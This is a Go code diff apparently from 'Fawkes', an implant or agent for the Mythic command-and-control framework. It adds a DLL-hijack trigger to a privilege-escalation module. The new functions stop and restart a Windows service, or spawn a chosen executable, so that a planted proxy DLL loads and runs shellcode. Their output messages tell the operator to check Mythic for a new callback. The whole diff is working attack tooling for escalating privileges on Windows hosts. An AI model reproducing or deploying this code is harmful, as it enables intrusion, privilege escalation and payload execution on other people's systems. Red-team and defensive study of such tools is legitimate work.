@@ -7,10 +7,15 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strings"
+	"time"
 
 	"fawkes/pkg/structs"
+
+	"golang.org/x/sys/windows/svc"
+	"golang.org/x/sys/windows/svc/mgr"
 )
 
 type hijackExportResult struct {
@@ -228,5 +233,126 @@ func winHijackCleanup(args privescCheckArgs) structs.CommandResult {
 	}
 
 	sb.WriteString("\n[+] Hijack cleaned up successfully")
+	return successResult(sb.String())
+}
+
+func winHijackTrigger(args privescCheckArgs) structs.CommandResult {
+	trigger := strings.ToLower(args.Trigger)
+	if trigger == "" {
+		return errorResult("Error: 'trigger' is required — use 'restart' (restart a service) or 'spawn' (launch a process)")
+	}
+
+	switch trigger {
+	case "restart":
+		return hijackTriggerRestart(args)
+	case "spawn":
+		return hijackTriggerSpawn(args)
+	default:
+		return errorf("Unknown trigger type: %s. Use: restart, spawn", args.Trigger)
+	}
+}
+
+func hijackTriggerRestart(args privescCheckArgs) structs.CommandResult {
+	if args.ServiceName == "" {
+		return errorResult("Error: 'service_name' is required for restart trigger — name of the service that loads the hijacked DLL")
+	}
+
+	m, err := mgr.Connect()
+	if err != nil {
+		return errorf("Error connecting to Service Control Manager: %v", err)
+	}
+	defer m.Disconnect()
+
+	s, err := m.OpenService(args.ServiceName)
+	if err != nil {
+		return errorf("Error opening service '%s': %v — verify the service name and that you have sufficient privileges", args.ServiceName, err)
+	}
+	defer s.Close()
+
+	status, err := s.Query()
+	if err != nil {
+		return errorf("Error querying service '%s': %v", args.ServiceName, err)
+	}
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("[*] Triggering DLL hijack via service restart: %s\n", args.ServiceName))
+
+	if status.State == svc.Running || status.State == svc.StartPending {
+		sb.WriteString(fmt.Sprintf("[*] Stopping service (current state: %s)...\n", describeServiceState(status.State)))
+		_, err = s.Control(svc.Stop)
+		if err != nil {
+			return errorf("Error stopping service '%s': %v — may need SYSTEM or service-specific permissions", args.ServiceName, err)
+		}
+
+		deadline := time.Now().Add(30 * time.Second)
+		for time.Now().Before(deadline) {
+			status, err = s.Query()
+			if err != nil {
+				return errorf("Error querying service '%s' during stop: %v", args.ServiceName, err)
+			}
+			if status.State == svc.Stopped {
+				break
+			}
+			time.Sleep(500 * time.Millisecond)
+		}
+		if status.State != svc.Stopped {
+			return errorf("Service '%s' did not stop within 30s (state: %s)", args.ServiceName, describeServiceState(status.State))
+		}
+		sb.WriteString("[+] Service stopped\n")
+	} else {
+		sb.WriteString(fmt.Sprintf("[*] Service already stopped (state: %s)\n", describeServiceState(status.State)))
+	}
+
+	sb.WriteString("[*] Starting service (will load DLLs from application directory)...\n")
+	err = s.Start()
+	if err != nil {
+		sb.WriteString(fmt.Sprintf("[!] Service start failed: %v\n", err))
+		sb.WriteString("[*] This may be expected if the proxy DLL caused an error during load\n")
+		sb.WriteString("[*] Check if the shellcode executed despite the service start failure\n")
+		return structs.CommandResult{
+			Output:    sb.String(),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	sb.WriteString("[+] Service started — proxy DLL should have been loaded\n")
+	sb.WriteString("[+] If shellcode was a Fawkes payload, check for new callback in Mythic\n")
+	return successResult(sb.String())
+}
+
+func hijackTriggerSpawn(args privescCheckArgs) structs.CommandResult {
+	if args.Source == "" {
+		return errorResult("Error: 'source' is required for spawn trigger — full path to the executable that loads the hijacked DLL")
+	}
+
+	exePath, err := filepath.Abs(args.Source)
+	if err != nil {
+		return errorf("Error resolving path: %v", err)
+	}
+
+	if _, err := os.Stat(exePath); err != nil {
+		return errorf("Executable not found: %v", err)
+	}
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("[*] Triggering DLL hijack via process spawn: %s\n", exePath))
+
+	cmd := exec.Command(exePath)
+	cmd.Dir = filepath.Dir(exePath)
+	err = cmd.Start()
+	if err != nil {
+		return errorf("Error spawning process: %v", err)
+	}
+
+	sb.WriteString(fmt.Sprintf("[+] Process spawned: PID %d\n", cmd.Process.Pid))
+	sb.WriteString(fmt.Sprintf("[+] Working directory: %s\n", cmd.Dir))
+	sb.WriteString("[+] DLL search order will load from the application directory first\n")
+	sb.WriteString("[+] If shellcode was a Fawkes payload, check for new callback in Mythic\n")
+
+	go func() {
+		_ = cmd.Wait()
+	}()
+
 	return successResult(sb.String())
 }
